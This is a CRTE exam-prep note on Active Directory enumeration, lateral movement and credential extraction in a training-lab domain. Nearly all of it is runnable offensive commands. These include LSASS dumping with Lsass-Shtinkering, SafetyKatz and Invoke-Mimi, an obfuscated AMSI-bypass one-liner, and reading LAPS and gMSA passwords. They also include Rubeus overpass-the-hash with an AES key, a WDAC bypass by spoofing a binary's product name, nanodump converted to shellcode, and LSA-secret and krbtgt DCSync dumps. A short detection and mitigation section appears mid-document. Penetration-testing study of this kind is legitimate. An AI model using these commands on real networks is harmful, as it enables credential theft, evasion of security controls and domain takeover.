# Lateral Movement - CRTE

## Overview
Almost the same content as CRTP + Extracting Credentials from LSASS.

> See [CRTP Lateral Movement](https://johnermac.github.io/notes/crtp/latmov/) for the base content.

**Sources**:
- [johnermac.github.io](https://johnermac.github.io/review/crte/)
- [slytechroot/CRTO-CRTP-CRTE](https://github.com/slytechroot/CRTO-CRTP-CRTE)
- [francescolonardo/CRTE-Preparation](https://github.com/francescolonardo/CRTE-Preparation)

## Extracting Credentials from LSASS

### Lsass-Shtinkering

**Tool**: [Lsass-Shtinkering on GitHub](https://github.com/deepinstinct/Lsass-Shtinkering)

**Usage**:
```powershell
Lsass_Shtinkering.exe
```

**How it works**:
- Uses Windows Error Reporting Service to dump the **LSASS** process memory
- Manually reports an exception to **WER** on **LSASS** that will generate the dump without crashing the process

**Compatibility**:
- Works on **Windows 10, Server 2022**
- Does not work on **Server 2019** (during testing)

## Notes

This technique is useful when traditional LSASS dumping methods are blocked or detected. The WER-based approach can bypass some detection mechanisms.

### Defense - LSASS Credential Extraction
> See [AD Defense - Credential Guard](../crtp/ad-defense.md#credential-guard) for detailed detection and mitigation

**Detection**:
- Monitor for LSASS process access
- Monitor for WER (Windows Error Reporting) abuse
- Monitor for process dumps
- System Event ID 7045 - Service installation

**Mitigation**:
- Enable Credential Guard
- Enable LSA Protection (RunAsPPL)
- Monitor for LSASS access attempts
- Use Protected Users group
- Monitor for WER abuse

## Domain Enumeration

### Users, Computers, Groups, Admins, Kerberos Policy

We can use the Microsoft's ActiveDirectory module, BloodHound, PowerView or SharpView for enumerating the domain.

**BloodHound**

Run the following commands to gather data and information from the current domain.

```powershell
PS C:\AD\Tools> C:\AD\Tools\BloodHound-master\Collectors\sharphound-v2.6.0\SharpHound.exe --CollectionMethods All
```

We can upload/drag-and-drop the zip archive to BloodHound application for analysis.

**AD Module**

Let's start a PowerShell session using InvisiShell to avoid verbose logging.

```powershell
PS C:\AD\Tools> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
PS C:\AD\Tools> Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
PS C:\AD\Tools> Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

**Enumerate Users**

```powershell
PS C:\AD\Tools> Get-ADUser -Filter *
PS C:\AD\Tools> Get-ADUser -Filter * | Select -ExpandProperty samaccountname
```

**Enumerate Computers**

```powershell
PS C:\AD\Tools> Get-ADComputer –Filter * | select –expand name
```

**Enumerate Domain Administrators**

```powershell
PS C:\AD\Tools> Get-ADGroup -Identity 'Domain Admins' -Properties *
PS C:\AD\Tools> Get-ADGroupMember -Identity 'Domain Admins'
```

**Enumerate Enterprise Administrators**

Note: Enterprise Admins group is present only in the root of a forest.

```powershell
PS C:\AD\Tools> Get-ADGroupMember -Identity 'Enterprise Admins' -Server techcorp.local
```

**Enumerate Kerberos Policy**

```powershell
PS C:\AD\Tools> Get-DomainPolicy
PS C:\AD\Tools> (Get-DomainPolicy).KerberosPolicy
PS C:\AD\Tools> (Get-DomainPolicy).SystemAccess
```

### GPOs, OUs

**Enumerate Restricted Groups from GPO**

```powershell
PS C:\AD\Tools> Get-DomainGPOLocalGroup
```

**List all OUs**

```powershell
PS C:\AD\Tools> Get-DomainOU
PS C:\AD\Tools> Get-DomainOU | select -expand ou
PS C:\AD\Tools> Get-DomainOU | select -expand distinguishedname
```

**List all Computers in a specific OU**

```powershell
PS C:\AD\Tools> (Get-DomainOU -Identity Students).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
```

**List all GPOs**

```powershell
PS C:\AD\Tools> Get-DomainGPO
```

**Enumerate GPO applied on a specific OU**

```powershell
PS C:\AD\Tools> (Get-DomainOU -Identity Students).gplink
PS C:\AD\Tools> Get-DomainGPO -Identity '{FCE16496-C744-4E46-AC89-2D01D76EAD68}'
```

### ACLs

**Enumerate ACLs for Domain Admins group**

```powershell
PS C:\AD\Tools> Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose
```

**Find all modify rights/permissions for a user**

```powershell
PS C:\AD\Tools> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "studentuser51"}
```

### Domains, Forests, Trusts

**Enumerate all domains in the forest**

```powershell
PS C:\AD\Tools> (Get-ADForest).Domains
```

**Map the trusts of a domain**

```powershell
PS C:\AD\Tools> Get-ADTrust -Filter *
```

**Map external trusts in forest**

```powershell
PS C:\AD\Tools> (Get-ADForest).Name
PS C:\AD\Tools> Get-ADTrust -Filter 'intraForest -ne $True' -Server (Get-ADForest).Name
```

**Identify external trusts**

```powershell
PS C:\AD\Tools> (Get-ADForest).Domains | %{Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)' -Server $_}
```

**Enumerate trusts for a trusting forest**

```powershell
PS C:\AD\Tools> Get-ADTrust -Filter * -Server eu.local
```

## Credential Extraction

### LAPS (Local Administrator Password Solution) Abuse

**Identify OUs where LAPS is in use and users who can read passwords**

```powershell
PS C:\AD\Tools> C:\AD\Tools\Get-LapsPermissions.ps1
```

**Using PowerView**

```powershell
PS C:\AD\Tools> Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
```

**Read LAPS passwords**

```powershell
PS C:\AD\Tools> Get-ADComputer -Identity us-mailmgmt -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd
PS C:\AD\Tools> Get-DomainObject -Identity us-mailmgmt | select -ExpandProperty ms-mcs-admpwd
```

**Using LAPS module**

```powershell
PS C:\AD\Tools> Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1
PS C:\AD\Tools> Get-AdmPwdPassword -ComputerName us-mailmgmt | select -ExpandProperty Password
```

### LSASS Dump

**Extract credentials using SafetyKatz**

Use NetLoader to run SafetyKatz in memory:

```powershell
C:\Users\Administrator> echo %Pwn%
sekurlsa::ekeys

C:\Users\Administrator> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "%Pwn%" "exit"
```

**Extract credentials using Invoke-Mimi**

First, disable AMSI for the PSSession:

```powershell
S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

Then load Invoke-Mimi and execute:

```powershell
PS C:\AD\Tools> Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimi.ps1 -Session $mailmgmt
[us-mailmgmt]: PS C:\Users\Administrator\Documents> Invoke-Mimi -Command '"sekurlsa::keys"'
```

### LSASS Dump & User Hunting

**Extract secrets and hunt for local admin privileges**

After extracting credentials from LSASS, use the AES keys to perform OverPass-the-Hash:

```powershell
C:\Windows\System32> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:helpdeskadmin /aes256:f3ac0c70b3fdb36f25c0d5c9cc552fe9f94c39b705c4088a2bb7219ae9fb6534 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

**Hunt for local admin access**

```powershell
PS C:\Windows\system32> Import-Module C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
PS C:\Windows\system32> Find-PSRemotingLocalAdminAccess -Domain us.techcorp.local -Verbose
```

### GMSA (Group Managed Service Account) Abuse

**Enumerate gMSAs**

```powershell
PS C:\AD\Tools> Get-ADServiceAccount -Filter *
```

**Enumerate principals that can read passwords from gMSAs**

```powershell
PS C:\AD\Tools> Get-ADServiceAccount -Identity jumpone -Properties * | select PrincipalsAllowedToRetrieveManagedPassword
```

**Retrieve gMSA password**

```powershell
PS C:\Windows\system32> $passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
PS C:\Windows\system32> Import-Module C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1
PS C:\Windows\system32> $decodedpwd = ConvertFrom-ADManagedPasswordBlob $passwordblob
PS C:\Windows\system32> ConvertTo-NTHash –Password $decodedpwd.SecureCurrentPassword
```

### LSASS Dump with MDE & WDAC Bypass

**Check for EDR/AV**

```powershell
PS C:\Windows\system32> Import-Module C:\AD\Tools\Invoke-EDRChecker.ps1
PS C:\Windows\system32> Invoke-EDRChecker -Remote -ComputerName us-jump3
```

**Check WDAC status**

```powershell
PS C:\Windows\system32> winrs -r:us-jump3 "powershell Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard"
```

**Copy and parse WDAC policy**

```powershell
PS C:\Windows\system32> copy \\us-jump3.US.TECHCORP.LOCAL\c$\Windows\System32\CodeIntegrity\DG.bin.p7 C:\AD\Tools
PS C:\Users\studentuser51> Import-Module C:\AD\Tools\CIPolicyParser.ps1
PS C:\Users\studentuser51> ConvertTo-CIPolicy -BinaryFilePath C:\AD\Tools\DG.bin.p7 -XmlFilePath C:\AD\Tools\DG.bin.xml
```

**Bypass WDAC using rcedit**

Edit file attributes to match allowed Product Name:

```powershell
C:\AD\Tools> C:\AD\Tools\mockingjay\rcedit-x64.exe C:\AD\Tools\mockingjay\mockingjay.exe --set-version-string "ProductName" "Vmware Workstation"
```

**Convert nanodump to shellcode**

```powershell
PS C:\AD\Tools> C:\AD\Tools\mockingjay\donut.exe -f 1 -p " -sc -f --write nano.dmp" -i C:\AD\Tools\mockingjay\nanodump.x64.exe -o C:\AD\Tools\mockingjay\nano.bin
```

### LSA Secrets Dump

**Extract LSA secrets**

```powershell
Invoke-Mimikatz -Command '"lsadump::secrets"'
SafetyKatz.exe "lsadump::secrets"
```

### DCSync Attack via ACL Abuse

**Perform DCSync**

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
SafetyKatz.exe "lsadump::dcsync /user:domain\krbtgt"
```

## Last Updated
January 2025
